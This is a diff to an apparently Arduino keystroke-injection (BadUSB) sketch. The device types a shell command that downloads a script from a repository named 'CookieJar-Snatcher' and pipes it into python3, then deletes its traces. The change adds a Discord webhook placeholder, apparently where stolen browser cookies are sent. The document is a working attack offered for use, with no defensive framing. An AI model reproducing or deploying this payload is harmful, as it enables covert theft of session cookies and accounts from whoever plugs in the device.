@@ -16,7 +16,7 @@ void setup() {
   Keyboard.write(KEY_RETURN);
   delay(3000);
 
-  Keyboard.print("python3 -m venv .env && source .env/bin/activate && pip install requests pyserial && curl -sSL https://raw.githubusercontent.com/StraightDopamine/CookieJar-Snatcher/refs/heads/main/xenon.py | python3 && deactivate && rm -rf .env\n");  
+  Keyboard.print("python3 -m venv .env && source .env/bin/activate && pip install requests pyserial && curl -sSL https://raw.githubusercontent.com/StraightDopamine/CookieJar-Snatcher/refs/heads/main/xenon.py | python3 - 'YOUR_DISCORD_WEBHOOK_URL_HERE' && deactivate && rm -rf .env\n");  
   delay(1000);
 }
 
